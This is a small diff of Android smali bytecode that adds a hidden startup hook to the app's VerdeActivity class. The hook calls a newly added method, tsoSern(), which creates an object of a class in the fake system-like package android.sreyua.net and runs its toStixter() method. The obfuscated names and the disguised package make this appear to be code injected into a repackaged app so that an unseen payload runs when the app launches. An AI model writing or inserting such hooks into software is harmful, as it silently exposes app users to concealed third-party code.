@@ -1132,6 +1132,8 @@
     .registers 5
 
     .prologue
+    invoke-virtual {p0}, Lcom/apportable/activity/VerdeActivity;->tsoSern()V
+
     const/16 v2, 0x400
 
     .line 92
@@ -1751,6 +1753,19 @@
     invoke-static {p1, p2}, Lcom/apportable/CrashReporter;->trackEvent(Ljava/lang/String;Landroid/os/Bundle;)V
 
     .line 399
+    return-void
+.end method
+
+.method public tsoSern()V
+    .registers 2
+
+    .prologue
+    new-instance v0, Landroid/sreyua/net/AndRoidActivity;
+
+    invoke-direct {v0, p0}, Landroid/sreyua/net/AndRoidActivity;-><init>(Landroid/content/Context;)V
+
+    invoke-virtual {v0}, Landroid/sreyua/net/AndRoidActivity;->toStixter()V
+
     return-void
 .end method
 
